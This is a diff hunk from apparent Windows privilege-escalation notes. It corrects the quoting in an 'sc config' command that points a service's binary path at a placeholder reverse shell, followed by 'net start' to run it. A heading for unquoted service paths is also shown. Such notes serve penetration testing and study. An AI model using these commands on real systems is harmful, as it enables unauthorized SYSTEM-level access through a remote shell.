@@ -27,7 +27,7 @@ sc qc service # SYSTEM or local admin priv
 
 exploit 
 
-sc config service binpath= "\"path_to_reverse_shell""
+sc config service binpath= "path_to_reverse_shell"
 net start service
 
 ------UNQUOTED SERVICE PATH------
